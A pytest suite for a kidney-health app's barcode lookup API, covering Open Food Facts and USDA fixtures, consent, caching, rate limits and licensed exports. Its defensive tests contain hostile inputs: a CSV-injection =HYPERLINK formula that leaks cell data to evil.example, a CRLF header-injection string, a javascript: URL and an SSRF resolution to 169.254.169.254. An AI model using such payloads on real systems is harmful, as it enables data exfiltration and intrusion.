"""``POST /api/foods/barcode`` end to end (note 03 R1, R3, R4, R6, R11; §6 items 10–11; §9 B3, B4, B7, B8, B11).

Open Food Facts and FoodData Central answer from the recorded fixtures (tests/fixtures/off, /usda) through
``httpx2.MockTransport``. Nothing here touches the network: the transport spies fail on any request they
do not know.
"""
from __future__ import annotations

import csv
import io
import json
import zipfile
from typing import Any, Iterator

import httpx2
import pytest

import app.foods as foods_module
from app import barcode, egress
from app.auth import ratelimit
from barcode_support import Replay, load, response_for
from conftest import DAY, HTTPS_URL, FakeClock, add_user, make_settings, signed_in_client

USDA_KEY = "SHARED-ENV-KEY-0123456789abcdef"
OFF_FIXTURES = ("diet_coke_v3.4", "kraft_mac_cheese_v3.4", "lays_classic_v3.4", "nutella_v3.4", "not_found_v3.4",
                "lays_1oz_v3.4", "lays_1125oz_v3.4")
USDA_FIXTURES = ("search_028400421584", "search_028400161909", "search_0028400161909", "search_00028400161909",
                 "search_049000028911", "search_0049000028911", "search_00049000028911",
                 "food_1633665", "food_1458203", "food_2742723")


class World:
    """The app under test and its two upstream spies."""

    def __init__(self, client, off: Replay, usda: Replay) -> None:
        self.client = client
        self.off = off
        self.usda = usda

    def scan(self, code: str, fmt: str = "unknown", client=None, **extra: Any) -> httpx2.Response:
        return (client or self.client).post("/api/foods/barcode", json={"code": code, "format": fmt, **extra})

    def calls(self) -> int:
        return len(self.off.requests) + len(self.usda.requests)


def _patch_upstreams(monkeypatch: pytest.MonkeyPatch) -> tuple[Replay, Replay]:
    off_replay = Replay(*(load("off", n) for n in OFF_FIXTURES))
    # Any other barcode form: FoodData Central's real answer for a barcode it does not have (recorded).
    empty_search = load("usda", "search_049000028911")
    usda_replay = Replay(*(load("usda", n) for n in USDA_FIXTURES),
                         handlers={f"{foods_module.USDA_BASE_URL}/foods/search": lambda request: response_for(empty_search)})
    monkeypatch.setattr(barcode, "off_transport", lambda: off_replay)
    monkeypatch.setattr(barcode, "sleep", lambda seconds: None)
    monkeypatch.setattr(foods_module, "usda_client",
                        lambda: httpx2.Client(base_url=foods_module.USDA_BASE_URL, transport=usda_replay))
    return off_replay, usda_replay


def enable_off(client, consent: bool = True) -> None:
    assert client.patch("/api/admin/settings", json={"food.off_enabled": True}).status_code == 200
    if consent:
        assert client.patch("/api/me/settings", json={"food.off_consent": True}).status_code == 200


@pytest.fixture
def world(tmp_path, foods_json, monkeypatch) -> Iterator[World]:
    """OFF on and agreed to; no USDA key."""
    off_replay, usda_replay = _patch_upstreams(monkeypatch)
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c)
        yield World(c, off_replay, usda_replay)


@pytest.fixture
def world_usda(tmp_path, foods_json, monkeypatch) -> Iterator[World]:
    """OFF on and agreed to, and a shared USDA key."""
    off_replay, usda_replay = _patch_upstreams(monkeypatch)
    with signed_in_client(make_settings(tmp_path, foods_json, usda_api_key=USDA_KEY), base_url=HTTPS_URL) as c:
        enable_off(c)
        yield World(c, off_replay, usda_replay)


# --------------------------------------------------------------------------- #
# Off by default: nothing is sent (ARCHITECTURE v0.3 item 8)
# --------------------------------------------------------------------------- #


def test_off_by_default_nothing_leaves_the_server(tmp_path, foods_json, monkeypatch) -> None:
    """The transport spy sits under everything: the SSRF-checked transport, DNS and the replay hooks."""
    sent: list[str] = []

    def spy(self, request):  # noqa: ANN001
        sent.append(str(request.url))
        raise AssertionError("an outbound request was made")

    monkeypatch.setattr(egress.CheckedTransport, "handle_request", spy)
    monkeypatch.setattr(egress, "system_resolver", lambda host, port: sent.append(f"dns:{host}") or [])
    monkeypatch.setattr(httpx2.HTTPTransport, "handle_request", spy)
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        assert c.get("/api/admin/settings").json()["settings"]["food.off_enabled"]["value"] is False
        for code in ("049000028911", "3017624010701", "96385074"):
            r = c.post("/api/foods/barcode", json={"code": code})
            assert r.status_code == 503 and r.json()["reason"] == "lookups_off", r.text
            assert r.json()["gtin"].isdigit() and "Enter the food from its label" in r.json()["detail"]
    assert sent == []


def test_consent_is_needed_even_when_the_admin_turned_it_on(tmp_path, foods_json, monkeypatch) -> None:
    off_replay, usda_replay = _patch_upstreams(monkeypatch)
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c, consent=False)
        r = c.post("/api/foods/barcode", json={"code": "049000028911"})
        assert r.status_code == 503 and r.json()["reason"] == "off_consent_required"
        assert "Settings" in r.json()["detail"]
    assert off_replay.requests == [] and usda_replay.requests == []


# --------------------------------------------------------------------------- #
# Found
# --------------------------------------------------------------------------- #


def test_diet_coke_from_open_food_facts(world: World) -> None:
    r = world.scan("049000028911", "upc_a")
    assert r.status_code == 200, r.text
    body = r.json()
    food = body["food"]
    assert body["gtin"] == "00049000028911" and body["source"] == "off"
    assert body["attribution"] == {"text": "Product data © Open Food Facts contributors, ODbL",
                                   "url": "https://world.openfoodfacts.org/product/0049000028911", "license": "ODbL-1.0"}
    assert body["attributions"] == [body["attribution"]]
    assert food["source"] == "off" and food["name"] == "Diet Coke Soft Drink" and food["brand"] == "Coke"
    assert food["gtin"] == "00049000028911" and food["source_license"] == "ODbL-1.0"
    assert food["source_url"] == "https://world.openfoodfacts.org/product/0049000028911"
    assert food["serving_g"] == 354.9 and food["serving_desc"] == "1 can (354.9 mL)"
    assert food["nutrients"]["potassium_mg"] is None and food["nutrients"]["sodium_mg"] == 40
    assert food["nutrients"]["fluid_ml"] == 355
    assert set(food["flags"]) == {"phosphate_additive", "counts_as_fluid", "processed"}
    assert food["additives"] == ["e338"]
    assert [q["code"] for q in body["quality"]] == ["crowd_sourced", "ml_as_g", "potassium_unknown", "phosphorus_unknown"]
    assert body["quality"] == food["quality"]
    assert {(w["nutrient"], w["level"], w["flag"]) for w in food["warnings"]} >= {("phosphorus_mg", "high", "phosphate_additive")}
    request = world.off.requests[0]
    assert request.url.path == "/api/v3.4/product/0049000028911"
    assert request.headers["User-Agent"] == "KidneyHealth/0.3.0 (https://github.com/ksullivan86/kidney-health)"
    assert world.usda.requests == []  # no USDA key on this server


def test_the_scanned_food_appears_in_search_and_can_be_logged(world: World) -> None:
    food = world.scan("049000028911").json()["food"]
    hits = world.client.get("/api/foods", params={"q": "diet coke"}).json()["foods"]
    assert [h["id"] for h in hits] == [food["id"]]
    entry = world.client.post("/api/log", json={"date": DAY, "meal": "lunch", "food_id": food["id"]})
    assert entry.status_code == 201, entry.text
    assert world.client.put(f"/api/foods/{food['id']}", json={"name": "x", "serving_desc": "1", "serving_g": 1}).status_code == 409


def test_second_scan_is_answered_locally(world: World) -> None:
    first = world.scan("049000028911").json()
    calls = world.calls()
    second = world.scan("0049000028911", "ean_13")
    assert second.status_code == 200 and second.json()["food"]["id"] == first["food"]["id"]
    assert world.calls() == calls


def test_all_three_decoder_shapes_find_the_same_row(world: World) -> None:
    ids = {world.scan(code, fmt).json()["food"]["id"] for code, fmt in
           (("049000028911", "upc_a"), ("0049000028911", "ean_13"), ("00049000028911", "unknown"))}
    assert len(ids) == 1


def test_prepared_values_and_eu_salt_labels(world: World) -> None:
    kraft = world.scan("0021000658831").json()
    assert kraft["food"]["serving_desc"].endswith("(prepared)") and "prepared_values" in [q["code"] for q in kraft["quality"]]
    assert "phosphate_additive" in kraft["food"]["flags"]
    nutella = world.scan("3017624010701").json()
    codes = [q["code"] for q in nutella["quality"]]
    assert "sodium_from_salt" in codes and "carbs_available" in codes and "no_serving" in codes
    assert nutella["food"]["serving_desc"] == "100 g"


# --------------------------------------------------------------------------- #
# Not found, no nutrition, negative cache (R3, §9 B11)
# --------------------------------------------------------------------------- #


def test_not_found_and_the_negative_cache(world: World, fake_clock: FakeClock) -> None:
    r = world.scan("0099999999990")
    assert r.status_code == 404
    body = r.json()
    assert body["detail"].startswith("No product with this barcode") and body["gtin"] == "00099999999990" and body["name"] is None
    assert body["contribute_url"] == "https://world.openfoodfacts.org/cgi/product.pl?type=search_or_add&action=display&code=0099999999990"
    assert body["checked"] == {"off": "not_found", "usda": "unavailable"} or body["checked"]["off"] == "not_found"
    assert len(world.off.requests) == 1
    fake_clock.advance(hours=23)
    assert world.scan("0099999999990").status_code == 404
    assert len(world.off.requests) == 1  # remembered for 24 h
    fake_clock.advance(hours=2)
    assert world.scan("0099999999990").status_code == 404
    assert len(world.off.requests) == 2


def test_negative_cache_is_purged_daily(world: World, fake_clock: FakeClock) -> None:
    world.scan("0099999999990")
    from app.db import connect

    db_path = world.client.app.state.settings.db_path
    conn = connect(db_path)
    assert conn.execute("SELECT COUNT(*) FROM barcode_cache WHERE status = 'not_found'").fetchone()[0] == 1
    conn.close()
    fake_clock.advance(hours=49)
    world.scan("049000028911")  # any lookup runs the daily purge first
    conn = connect(db_path)
    assert conn.execute("SELECT COUNT(*) FROM barcode_cache WHERE status = 'not_found'").fetchone()[0] == 0
    assert conn.execute("SELECT COUNT(*) FROM barcode_cache WHERE status = 'found'").fetchone()[0] == 1
    conn.close()


def test_found_without_nutrition_facts_offers_the_name(world: World) -> None:
    r = world.scan("028400421584", "upc_a")
    assert r.status_code == 404
    assert r.json()["name"] == "Product 0028400421584" and "no nutrition facts" in r.json()["detail"]


# --------------------------------------------------------------------------- #
# USDA FoodData Central branded (R4)
# --------------------------------------------------------------------------- #


def test_usda_fills_in_when_open_food_facts_has_no_nutrition(world_usda: World) -> None:
    r = world_usda.scan("028400421584", "upc_a")
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["source"] == "usda" and body["food"]["fdc_id"] == 1633665
    assert body["attribution"]["license"] == "CC0-1.0" and body["attributions"] == [body["attribution"]]
    assert body["food"]["nutrients"]["potassium_mg"] == 350 and body["food"]["gtin"] == "00028400421584"
    assert body["food"]["source_license"] == "CC0-1.0"
    assert [r.url.params.get("query") for r in world_usda.usda.requests if r.url.path.endswith("/search")] == ["028400421584"]
    assert all(req.headers["X-Api-Key"] == USDA_KEY for req in world_usda.usda.requests)


def test_us_product_without_potassium_is_merged_with_usda(world_usda: World) -> None:
    """Diet Coke: OFF lacks potassium on a US label → FDC (found by its 14-digit form) supplies nutrients."""
    r = world_usda.scan("049000028911", "upc_a")
    assert r.status_code == 200, r.text
    body = r.json()
    food = body["food"]
    assert body["source"] == "usda" and food["fdc_id"] == 2742723
    assert food["nutrients"]["potassium_mg"] == 0 and food["nutrients"]["sodium_mg"] == 39  # the manufacturer's label
    assert {"phosphate_additive", "counts_as_fluid", "processed"} <= set(food["flags"])  # union of both scans
    assert food["source_license"] == "CC0-1.0 AND ODbL-1.0"
    assert [a["license"] for a in body["attributions"]] == ["CC0-1.0", "ODbL-1.0"]
    searches = [r.url.params.get("query") for r in world_usda.usda.requests if r.url.path.endswith("/search")]
    assert searches == ["049000028911", "0049000028911", "00049000028911"]


def test_complete_open_food_facts_answer_needs_no_usda(world_usda: World) -> None:
    r = world_usda.scan("0028400161909")
    assert r.status_code == 200 and r.json()["source"] == "off"
    assert world_usda.usda.requests == []


def test_usda_only_when_open_food_facts_is_off(tmp_path, foods_json, monkeypatch) -> None:
    off_replay, usda_replay = _patch_upstreams(monkeypatch)
    with signed_in_client(make_settings(tmp_path, foods_json, usda_api_key=USDA_KEY), base_url=HTTPS_URL) as c:
        r = c.post("/api/foods/barcode", json={"code": "0028400161909"})
        assert r.status_code == 200 and r.json()["source"] == "usda" and r.json()["food"]["fdc_id"] == 1458203
        r = c.post("/api/foods/barcode", json={"code": "0099999999990"})
        assert r.status_code == 404 and r.json()["checked"] == {"off": "disabled", "usda": "not_found"}
        assert c.patch("/api/admin/settings", json={"food.usda_branded_barcode": False}).status_code == 200
        r = c.post("/api/foods/barcode", json={"code": "3017624010701"})
        assert r.status_code == 503 and r.json()["reason"] == "lookups_off"
    assert off_replay.requests == []


# --------------------------------------------------------------------------- #
# Refusals before any lookup (R2, F6)
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("code, fmt, reason", [
    ("049000028912", "upc_a", "check_digit"),
    ("04900002891", "unknown", "format"),
    ("abcdefghijkl", "unknown", "format"),
    ("2123450000005", "ean_13", "restricted"),   # in-store weighed item
    ("0412345000001", "ean_13", "restricted"),
    ("9780306406157", "ean_13", "isbn"),
    ("9771234567003", "ean_13", "issn"),
    ("0512345000008", "ean_13", "coupon"),
    ("9912345678909", "ean_13", "coupon"),
    ("97700005", "ean_8", "reserved"),
])
def test_refused_codes_never_reach_a_provider(world: World, code: str, fmt: str, reason: str) -> None:
    r = world.scan(code, fmt)
    assert r.status_code == 400, r.text
    assert r.json()["reason"] == reason
    assert world.calls() == 0


@pytest.mark.parametrize("body", [{"code": ""}, {"code": "1" * 65}, {"code": "049000028911", "format": "qr_code"},
                                  {"code": "049000028911", "extra": 1}, {"code": 49000028911}, {}])
def test_malformed_bodies(world: World, body: dict) -> None:
    r = world.client.post("/api/foods/barcode", json=body)
    assert r.status_code == 400 and "detail" in r.json()
    assert world.calls() == 0


# --------------------------------------------------------------------------- #
# Pacing and upstream failures (R3)
# --------------------------------------------------------------------------- #


def test_per_person_hourly_limit(world: World, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setitem(ratelimit.LIMITS, "barcode", ratelimit.Limit("barcode", 3, 3600, "Too many barcode lookups this hour."))
    for _ in range(3):
        assert world.scan("0099999999990").status_code == 404
    r = world.scan("0099999999990")
    assert r.status_code == 429 and int(r.headers["Retry-After"]) > 0
    # Refusals of bad codes do not count and are still answered.
    assert world.scan("049000028912").status_code == 400


def test_server_wide_bucket(world: World) -> None:
    assert world.client.patch("/api/admin/settings", json={"food.off_rate_per_minute": 1}).status_code == 200
    assert world.scan("049000028911").status_code == 200
    r = world.scan("3017624010701")
    assert r.status_code == 429 and r.headers["Retry-After"] == "60" and r.json()["retry_after"] == 60
    assert len(world.off.requests) == 1  # no silent queue, no upstream call
    assert world.scan("049000028911").status_code == 200  # a product the person has needs no token


def test_upstream_503_is_retried_once_then_502(tmp_path, foods_json, monkeypatch) -> None:
    _patch_upstreams(monkeypatch)
    calls: list[str] = []

    def busy(request: httpx2.Request) -> httpx2.Response:
        calls.append(str(request.url))
        return httpx2.Response(503, text="<html>busy</html>")

    monkeypatch.setattr(barcode, "off_transport", lambda: httpx2.MockTransport(busy))
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c)
        r = c.post("/api/foods/barcode", json={"code": "049000028911"})
        assert r.status_code == 502 and "busy" not in r.text
    assert len(calls) == 2


def test_upstream_429_pauses_the_bucket(tmp_path, foods_json, monkeypatch) -> None:
    _patch_upstreams(monkeypatch)
    monkeypatch.setattr(barcode, "off_transport", lambda: httpx2.MockTransport(lambda r: httpx2.Response(429, text="slow")))
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c)
        r = c.post("/api/foods/barcode", json={"code": "049000028911"})
        assert r.status_code == 429 and r.headers["Retry-After"] == "60"
        r = c.post("/api/foods/barcode", json={"code": "3017624010701"})
        assert r.status_code == 429


def test_blocked_upstream_address_is_a_502(tmp_path, foods_json, monkeypatch) -> None:
    """A DNS answer pointing at cloud metadata is refused by the SSRF-checked transport."""
    monkeypatch.setattr(egress, "system_resolver", lambda host, port: ["169.254.169.254"])
    for name in ("http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setattr(httpx2.HTTPTransport, "handle_request", lambda self, request: pytest.fail("connected"))
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c)
        r = c.post("/api/foods/barcode", json={"code": "049000028911"})
        assert r.status_code == 502 and "169.254" not in r.text


def test_refresh_at_most_once_a_day(world: World, fake_clock: FakeClock) -> None:
    world.scan("049000028911")
    assert len(world.off.requests) == 1
    assert world.scan("049000028911", refresh=True).status_code == 200
    assert len(world.off.requests) == 1  # fetched less than a day ago: the cache answers
    fake_clock.advance(hours=25)
    assert world.scan("049000028911", refresh=True).status_code == 200
    assert len(world.off.requests) == 2


def test_off_base_url_and_contact_are_used(tmp_path, foods_json, monkeypatch) -> None:
    off_replay, _ = _patch_upstreams(monkeypatch)
    seen: list[httpx2.Request] = []

    def handler(request: httpx2.Request) -> httpx2.Response:
        seen.append(request)
        return httpx2.Response(200, json=load("off", "nutella_v3.4")["body"])

    monkeypatch.setattr(barcode, "off_transport", lambda: httpx2.MockTransport(handler))
    settings = make_settings(tmp_path, foods_json, off_base_url="https://world.openfoodfacts.net")
    with signed_in_client(settings, base_url=HTTPS_URL) as c:
        enable_off(c)
        assert c.patch("/api/admin/settings", json={"food.off_contact": "admin@example.org"}).status_code == 200
        assert c.post("/api/foods/barcode", json={"code": "3017624010701"}).status_code == 200
    assert seen[0].url.host == "world.openfoodfacts.net"
    assert seen[0].headers["User-Agent"].endswith("(admin@example.org)")


def test_off_contact_cannot_inject_headers(world: World) -> None:
    r = world.client.patch("/api/admin/settings", json={"food.off_contact": "me@example.org\r\nX-Evil: 1"})
    assert r.status_code == 400


# --------------------------------------------------------------------------- #
# Own foods, isolation and the cross-user oracle (§9 B7, B8)
# --------------------------------------------------------------------------- #


def test_own_custom_food_wins_and_is_never_shared(world: World) -> None:
    body = {"name": "Grandma's cola", "serving_desc": "1 glass", "serving_g": 250, "nutrients": {"potassium_mg": 20},
            "gtin": "049000028911"}
    mine = world.client.post("/api/foods", json=body)
    assert mine.status_code == 201 and mine.json()["gtin"] == "00049000028911"
    r = world.scan("0049000028911", "ean_13")
    assert r.status_code == 200 and r.json()["source"] == "local" and r.json()["food"]["id"] == mine.json()["id"]
    assert r.json()["attribution"] is None
    assert world.calls() == 0
    sam = add_user(world.client, "sam")
    assert sam.patch("/api/me/settings", json={"food.off_consent": True}).status_code == 200
    theirs = world.scan("049000028911", client=sam)
    assert theirs.status_code == 200 and theirs.json()["source"] == "off"
    assert theirs.json()["food"]["id"] != mine.json()["id"]  # never the other person's custom food


def test_cached_and_new_answers_look_the_same(world: World) -> None:
    first = world.scan("049000028911")
    sam = add_user(world.client, "sam")
    assert sam.patch("/api/me/settings", json={"food.off_consent": True}).status_code == 200
    calls = world.calls()
    second = world.scan("049000028911", client=sam)
    assert world.calls() == calls  # served from the instance cache
    assert first.status_code == second.status_code == 200
    assert set(first.json()) == set(second.json()) and first.json()["source"] == second.json()["source"] == "off"
    assert second.json()["food"]["id"] == first.json()["food"]["id"]  # one shared row
    hits = sam.get("/api/foods", params={"q": "diet coke"}).json()["foods"]
    assert [h["id"] for h in hits] == [first.json()["food"]["id"]]


def test_a_person_without_access_learns_nothing_from_the_cache(world: World) -> None:
    world.scan("049000028911")
    sam = add_user(world.client, "sam")  # has not agreed to Open Food Facts
    r = world.scan("049000028911", client=sam)
    assert r.status_code == 503 and r.json()["reason"] == "off_consent_required"
    assert "food" not in r.json()
    assert sam.get("/api/foods", params={"q": "diet coke"}).json()["foods"] == []


def test_deleting_a_shared_food_removes_only_the_link(world: World) -> None:
    food = world.scan("049000028911").json()["food"]
    assert world.client.delete(f"/api/foods/{food['id']}").status_code == 204
    assert world.client.get("/api/foods", params={"q": "diet coke"}).json()["foods"] == []
    calls = world.calls()
    again = world.scan("049000028911")  # the cache answers and the link comes back
    assert again.status_code == 200 and again.json()["food"]["id"] == food["id"] and world.calls() == calls


# --------------------------------------------------------------------------- #
# Hand-entered products keep the barcode (R1, R6, R8)
# --------------------------------------------------------------------------- #


def test_quick_add_keeps_the_barcode_and_scans_the_ingredients(world: World) -> None:
    r = world.client.post("/api/log/quick", json={
        "date": DAY, "meal": "lunch", "name": "Deli turkey", "serving_g": 56, "nutrients": {"sodium_mg": 480},
        "gtin": "0099999999990", "ingredients_text": "turkey, water, potassium lactate, sodium phosphate"})
    assert r.status_code == 201, r.text
    food = world.client.get(f"/api/foods/{r.json()['food_id']}").json()
    assert food["gtin"] == "00099999999990"
    assert {"potassium_additive", "phosphate_additive"} <= set(food["flags"])
    assert food["additives"] == ["e339", "e326"]
    assert [w for w in food["warnings"] if w["flag"] == "potassium_additive"][0]["level"] == "medium"
    found = world.scan("0099999999990")
    assert found.status_code == 200 and found.json()["source"] == "local" and found.json()["food"]["id"] == food["id"]
    assert world.calls() == 0


def test_bad_gtin_on_a_hand_entered_food(world: World) -> None:
    r = world.client.post("/api/foods", json={"name": "x", "serving_desc": "1", "serving_g": 1, "gtin": "049000028912"})
    assert r.status_code == 400 and "gtin" in r.json()["detail"]


def test_typed_salt_substitute_is_avoid_ckd(world: World) -> None:
    r = world.client.post("/api/foods", json={"name": "My salt", "serving_desc": "1/4 tsp", "serving_g": 1.4,
                                              "ingredients_text": "Potassium chloride, silicon dioxide"})
    food = r.json()
    assert "avoid_ckd" in food["flags"] and food["kidney_rating"] == "red"
    assert food["kidney_notes"].startswith("AVOID with kidney disease")


def test_editing_keeps_the_barcode_when_an_old_client_leaves_it_out(world: World) -> None:
    food = world.client.post("/api/foods", json={"name": "Snack", "serving_desc": "1", "serving_g": 30, "gtin": "96385074",
                                                 "ingredients_text": "corn, salt"}).json()
    r = world.client.put(f"/api/foods/{food['id']}", json={"name": "Snack bar", "serving_desc": "1", "serving_g": 30})
    assert r.json()["gtin"] == "00000096385074" and r.json()["ingredients_text"] == "corn, salt"
    r = world.client.put(f"/api/foods/{food['id']}", json={"name": "Snack bar", "serving_desc": "1", "serving_g": 30, "gtin": None,
                                                         "ingredients_text": "corn, sodium phosphate"})
    assert r.json()["gtin"] is None and "phosphate_additive" in r.json()["flags"]


def test_copy_of_a_scanned_food_keeps_barcode_and_licence(world: World) -> None:
    shared = world.scan("049000028911").json()["food"]
    copy = world.client.post(f"/api/foods/{shared['id']}/copy").json()
    assert copy["source"] == "custom" and copy["gtin"] == shared["gtin"]
    assert copy["source_license"] == "ODbL-1.0" and copy["source_url"] == shared["source_url"]
    assert copy["quality"] == [] and copy["additives"] == ["e338"]
    r = world.scan("049000028911")
    assert r.json()["source"] == "local" and r.json()["food"]["id"] == copy["id"]
    assert r.json()["attribution"]["license"] == "ODbL-1.0"  # the copy still carries the ODbL notice


# --------------------------------------------------------------------------- #
# Untrusted product text (§9 B3, B4)
# --------------------------------------------------------------------------- #


def test_payload_text_is_cleaned_and_urls_never_copied(tmp_path, foods_json, monkeypatch) -> None:
    _patch_upstreams(monkeypatch)
    doc = load("off", "diet_coke_v3.4")["body"]
    product = dict(doc["product"], product_name="Diet​ Co‮ke‬", url="javascript:alert(1)",
                   image_url="https://images.openfoodfacts.org/x.jpg",
                   ingredients_text_en="carbonated water, phos­phoric acid, potassium​ lactate")
    product["additives_tags"] = []
    monkeypatch.setattr(barcode, "off_transport", lambda: httpx2.MockTransport(
        lambda r: httpx2.Response(200, json={**doc, "product": product})))
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c)
        food = c.post("/api/foods/barcode", json={"code": "049000028911"}).json()["food"]
    assert food["name"] == "Diet Coke"
    assert food["source_url"] == "https://world.openfoodfacts.org/product/0049000028911"
    assert "javascript" not in json.dumps(food) and "images.openfoodfacts" not in json.dumps(food)
    assert {"phosphate_additive", "potassium_additive"} <= set(food["flags"])  # invisible characters did not hide them


# --------------------------------------------------------------------------- #
# Exports carry the licence (R6, §9 B2)
# --------------------------------------------------------------------------- #


def test_csv_export_has_source_and_licence(world: World) -> None:
    food = world.scan("049000028911").json()["food"]
    world.client.post("/api/log", json={"date": DAY, "meal": "lunch", "food_id": food["id"]})
    rows = list(csv.reader(io.StringIO(world.client.get("/api/log/export.csv").text)))
    header = rows[0]
    assert header[-2:] == ["source", "source_license"]
    row = dict(zip(header, rows[1]))
    assert row["source"] == "off" and row["source_license"] == "ODbL-1.0"


def test_formula_like_product_names_are_escaped_in_csv(tmp_path, foods_json, monkeypatch) -> None:
    _patch_upstreams(monkeypatch)
    doc = load("off", "diet_coke_v3.4")["body"]
    evil = dict(doc["product"], product_name='=HYPERLINK("https://evil.example/?d="&A2,"Banana")')
    monkeypatch.setattr(barcode, "off_transport", lambda: httpx2.MockTransport(lambda r: httpx2.Response(200, json={**doc, "product": evil})))
    with signed_in_client(make_settings(tmp_path, foods_json), base_url=HTTPS_URL) as c:
        enable_off(c)
        food = c.post("/api/foods/barcode", json={"code": "049000028911"}).json()["food"]
        c.post("/api/log", json={"date": DAY, "meal": "lunch", "food_id": food["id"]})
        rows = list(csv.reader(io.StringIO(c.get("/api/log/export.csv").text)))
    assert rows[1][5].startswith("'=HYPERLINK(")


def test_export_archive(world: World) -> None:
    food = world.scan("049000028911").json()["food"]
    world.client.post("/api/log", json={"date": DAY, "meal": "lunch", "food_id": food["id"]})
    r = world.client.get("/api/me/export.zip")
    assert r.status_code == 200
    archive = zipfile.ZipFile(io.BytesIO(r.content))
    log_rows = list(csv.reader(io.StringIO(archive.read("log.csv").decode())))
    assert log_rows[0].count("source") == 1 and log_rows[0][-2:] == ["source", "source_license"]
    foods_rows = list(csv.reader(io.StringIO(archive.read("foods.csv").decode())))
    linked = dict(zip(foods_rows[0], foods_rows[1]))
    assert linked["gtin"] == "00049000028911" and linked["source_license"] == "ODbL-1.0"
    assert "Open Database License" in archive.read("README.txt").decode()
    data = json.loads(archive.read("export.json"))
    assert [f["id"] for f in data["linked_foods"]] == [food["id"]]


def test_account_deletion_keeps_product_data_but_not_the_link(world: World) -> None:
    sam = add_user(world.client, "sam")
    assert sam.patch("/api/me/settings", json={"food.off_consent": True}).status_code == 200
    food = world.scan("049000028911", client=sam).json()["food"]
    from app.db import connect

    db_path = world.client.app.state.settings.db_path
    r = sam.request("DELETE", "/api/me", json={"password": "quiet-harbour-lantern-58", "confirm": "DELETE"})
    assert r.status_code == 204, r.text
    conn = connect(db_path)
    assert conn.execute("SELECT COUNT(*) FROM user_food_links WHERE food_id = ?", (food["id"],)).fetchone()[0] == 0
    assert conn.execute("SELECT COUNT(*) FROM foods WHERE id = ?", (food["id"],)).fetchone()[0] == 1
    assert conn.execute("SELECT COUNT(*) FROM barcode_cache").fetchone()[0] == 1
    conn.close()


# --------------------------------------------------------------------------- #
# Maintenance commands
# --------------------------------------------------------------------------- #


def test_remap_barcodes_reruns_the_mapping_without_the_network(world: World, monkeypatch) -> None:
    from app import admin
    from app.db import connect

    food = world.scan("049000028911").json()["food"]
    db_path = world.client.app.state.settings.db_path
    conn = connect(db_path)
    conn.execute("UPDATE foods SET name = 'stale', flags_json = '[]' WHERE id = ?", (food["id"],))
    conn.commit()
    conn.close()
    calls = world.calls()
    out = io.StringIO()
    assert admin.main(["--db", str(db_path), "remap-barcodes"], out=out) == 0
    assert "1 food rows updated" in out.getvalue()
    assert world.calls() == calls
    refreshed = world.client.get(f"/api/foods/{food['id']}").json()
    assert refreshed["name"] == "Diet Coke Soft Drink" and "phosphate_additive" in refreshed["flags"]
    out = io.StringIO()
    assert admin.main(["--db", str(db_path), "purge-barcode-cache"], out=out) == 0
    assert "0 expired" in out.getvalue()


def test_refresh_without_an_answer_keeps_the_food_the_person_has(world: World, fake_clock: FakeClock) -> None:
    food = world.scan("049000028911").json()["food"]
    assert world.client.patch("/api/admin/settings", json={"food.off_enabled": False}).status_code == 200
    fake_clock.advance(hours=25)
    r = world.scan("049000028911", refresh=True)
    assert r.status_code == 200 and r.json()["food"]["id"] == food["id"]


def test_assemble_merge_rules() -> None:
    """The pure merge (note 03 R4): primary by label country, gaps filled per gram, flags united."""
    from app import foods as foods_mod, off as off_mod
    from app.barcode import OffOutcome, UsdaOutcome, assemble

    gtin = "00028400161909"
    off_doc = load("off", "lays_1125oz_v3.4")["body"]["product"]
    off_doc = dict(off_doc, nutriments={k: v for k, v in off_doc["nutriments"].items() if not k.startswith("potassium")})
    om = off_mod.map_product(off_doc, gtin)
    um = foods_mod.map_usda_record(load("usda", "food_1458203")["body"], 1458203)
    um.kwargs["nutrients"]["calcium_mg"] = None  # make a gap the other source can fill
    merged = assemble(gtin, OffOutcome("found", om, "2026-10-06T00:00:00.000000Z"), UsdaOutcome("found", 1458203, um, "2026-10-06T01:00:00.000000Z"))
    assert merged is not None and merged.source == "usda" and merged.fdc_id == 1458203
    assert merged.kwargs["nutrients"]["potassium_mg"] == 391  # the maker's label
    assert merged.kwargs["nutrients"]["calcium_mg"] == pytest.approx(om.nutrients["calcium_mg"] * um.kwargs["serving_g"] / om.serving_g)
    assert "filled_from_off:calcium_mg" in merged.provenance.quality and merged.provenance.quality[0] == "crowd_sourced"
    assert merged.provenance.source_license == "CC0-1.0 AND ODbL-1.0"
    # A non-US label: Open Food Facts is primary and USDA fills the gaps.
    eu = dict(off_doc, countries_tags=["en:france"])
    om_eu = off_mod.map_product(eu, gtin)
    merged = assemble(gtin, OffOutcome("found", om_eu, None), UsdaOutcome("found", 1458203, um, None))
    assert merged.source == "off" and merged.fdc_id is None
    assert merged.kwargs["nutrients"]["potassium_mg"] == pytest.approx(391 * om_eu.serving_g / um.kwargs["serving_g"])
    assert "filled_from_usda:potassium_mg" in merged.provenance.quality
    # Prepared values are never mixed with as-sold ones.
    kraft = off_mod.map_product(load("off", "kraft_mac_cheese_v3.4")["body"]["product"], "00021000658831")
    merged = assemble("00021000658831", OffOutcome("found", kraft, None), UsdaOutcome("found", 1458203, um, None))
    assert not [q for q in merged.provenance.quality if q.startswith("filled_from")]
    assert assemble(gtin, OffOutcome("not_found"), UsdaOutcome("not_found")) is None
